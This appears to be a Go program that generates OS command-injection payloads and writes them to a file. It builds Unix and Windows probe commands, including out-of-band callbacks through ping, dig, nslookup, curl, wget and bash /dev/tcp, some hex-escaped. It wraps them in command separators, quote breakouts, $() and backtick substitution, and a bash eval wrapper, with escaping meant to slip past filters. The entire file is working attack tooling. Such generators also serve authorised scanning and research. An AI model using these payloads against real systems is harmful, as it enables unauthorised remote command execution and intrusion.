package main

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"
	"flag"
)

type transformer struct {
	function func(string) string
	rarity   int
}

func makeTransformer(function func(string) string, rarity int) transformer {
	return transformer{
		function: function,
		rarity:   rarity,
	}
}

func filterTransformers(unfiltered []transformer, rarity int) []func(string) string {
	filtered := []func(string) string{}
	for _, i := range unfiltered {
		if i.rarity <= rarity {
			filtered = append(filtered, i.function)
		}
	}
	return filtered
}

type osPayloads struct {
	payloads        []transformer
	blindPayloads   []transformer
	embeddings      []transformer
	blindEmbeddings []transformer
}

func backslashEscapeForDash(s string) string {
	builder := strings.Builder{}
	for _, c := range s {
		builder.WriteString(fmt.Sprintf("\\%c", c))
	}
	return builder.String()
}

func doubleEscapeForBash(s string) string {
	builder := strings.Builder{}
	builder.WriteString(`"`)
	b := []byte(s)
	for _, code := range b {
		builder.WriteString(fmt.Sprintf("\\\\x%02x", code))
	}
	builder.WriteString(`"`)
	return builder.String()
}

func sprintfWithBackslashEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, backslashEscapeForDash(t))
	}
}

func sprintfWithDoubleEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, doubleEscapeForBash(t))
	}
}

func sprintfWithDotEscape(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, strings.ReplaceAll(t, ".", "\\."))
	}
}

var unixPayloads osPayloads = osPayloads{
	payloads: []transformer{
		makeTransformer(sprintfWithDoubleEscape("echo -e %s"), 2),
		makeTransformer(sprintfWithDoubleEscape("printf %s"), 2),
		makeTransformer(sprintfWithBackslashEscape("printf %s"), 1),
	},
	blindPayloads: []transformer{
		makeTransformer(sprintfWithDotEscape("ping -c 1 %s"), 1),
		makeTransformer(sprintfWithDotEscape("dig %s"), 2),
		makeTransformer(sprintfWithDotEscape("nslookup %s"), 2),
		makeTransformer(sprintfWithDotEscape("wget http://%s/ -O /dev/null"), 1),
		makeTransformer(sprintfWithDotEscape("curl http://%s/"), 2),
		makeTransformer(sprintfWithDotEscape("curl %s"), 1),
		makeTransformer(sprintfWithDotEscape("true < /dev/tcp/%s/80"), 1),
		makeTransformer(sprintfWithDotEscape(`true < "$(printf \\x2fdev\\x2ftcp\\x2f%s\\x2f80)"`), 1),
	},
	embeddings: []transformer{
		makeTransformer(func(arg string) string {
			return "; " + arg + "; "
		}, 1),
		makeTransformer(func(arg string) string {
			return "; " + arg + " 2>&1; "
		}, 2),
		makeTransformer(func(arg string) string {
			return " && false || " + arg + " && "
		}, 2),
		makeTransformer(func(arg string) string {
			return " && false || " + arg + " 2>&1 && "
		}, 2),
		makeTransformer(func(arg string) string {
			return "\"; " + arg + "; \""
		}, 1),
		makeTransformer(func(arg string) string {
			return "'; " + arg + "; '"
		}, 1),
		makeTransformer(func(arg string) string {
			return "\"; " + arg + " 2>&1; \""
		}, 2),
		makeTransformer(func(arg string) string {
			return "'; " + arg + " 2>&1; '"
		}, 2),
		makeTransformer(func(arg string) string {
			return arg
		}, 1),
		makeTransformer(func(arg string) string {
			return `bash -c "$@" x eval ` + arg + `;`
		}, 1),
	},
	blindEmbeddings: []transformer{
		makeTransformer(func(arg string) string {
			return "$(" + arg + ")"
		}, 1),
		makeTransformer(func(arg string) string {
			return "`" + arg + "`"
		}, 1),
	},
}

func escapeStringForCmdExe(s string) string {
	builder := strings.Builder{}
	for _, c := range s {
		builder.WriteString(fmt.Sprintf("^%c", c))
	}
	return builder.String()
}

func sprintfForCmdExe(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, escapeStringForCmdExe(t))
	}
}

func sprintfWithDotEscapeForCmdExe(s string) func(string) string {
	return func(t string) string {
		return fmt.Sprintf(s, strings.ReplaceAll(t, ".", "^."))
	}
}

var windowsPayloads osPayloads = osPayloads{
	payloads: []transformer{
		makeTransformer(sprintfForCmdExe("echo %s"), 1),
	},
	blindPayloads: []transformer{
		makeTransformer(sprintfWithDotEscapeForCmdExe("ping -n 1 %s"), 2),
		makeTransformer(sprintfWithDotEscapeForCmdExe("nslookup %s"), 1),
	},
	embeddings: []transformer{
		makeTransformer(func(arg string) string {
			return " & " + arg + " & "
		}, 1),
	},
}

var operatingSystems []osPayloads = []osPayloads{unixPayloads, windowsPayloads}

var escapers = []transformer{
	makeTransformer(func(arg string) string {
		return arg
	}, 1),
	makeTransformer(func(arg string) string {
		return strings.ReplaceAll(arg, "%", "%%")
	}, 1),
}

func randomToken() string {
	var token [32]byte
	rand.Seed(time.Now().UnixNano())
	rand.Read(token[:])
	return hex.EncodeToString(token[:])
}

func GenerateNormalPayloads(rarity int) []func(string) string {
	payloads := []func(string) string{}
	for _, os := range operatingSystems {
		for _, payload := range filterTransformers(os.payloads, rarity) {
			for _, embedding := range filterTransformers(os.embeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
		}
	}
	return payloads
}

func GenerateBlindPayloads(rarity int) []func(string) string {
	payloads := []func(string) string{}
	for _, os := range operatingSystems {
		for _, payload := range filterTransformers(os.blindPayloads, rarity) {
			for _, embedding := range filterTransformers(os.embeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
			for _, embedding := range filterTransformers(os.blindEmbeddings, rarity) {
				for _, escaper := range filterTransformers(escapers, rarity) {
					payloads = append(payloads, func(token string) string {
						return escaper(embedding(payload(token)))
					})
				}
			}
		}
	}
	return payloads
}

func main() {
	// 命令行参数
	outputFile := flag.String("output", "payloads.txt", "输出文件名")
	rarity := flag.Int("rarity", 1, "payload 的稀有度（1 到 2）")
	flag.Parse()

	// 生成正常负载和盲目负载
	normalPayloads := GenerateNormalPayloads(*rarity)
	blindPayloads := GenerateBlindPayloads(*rarity)

	// 将 payload 写入文件
	file, err := os.Create(*outputFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: 创建文件失败: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	// 生成随机令牌
	token := randomToken()

	// 写入正常负载
	for _, payloadFunc := range normalPayloads {
		payload := payloadFunc(token)
		fmt.Fprintf(file, "Normal Payload: %s\n", payload)
	}

	// 写入盲目负载
	for _, payloadFunc := range blindPayloads {
		payload := payloadFunc(token)
		fmt.Fprintf(file, "Blind Payload: %s\n", payload)
	}

	fmt.Printf("已生成 %d 个正常负载和 %d 个盲目负载到 %s\n", len(normalPayloads), len(blindPayloads), *outputFile)
}
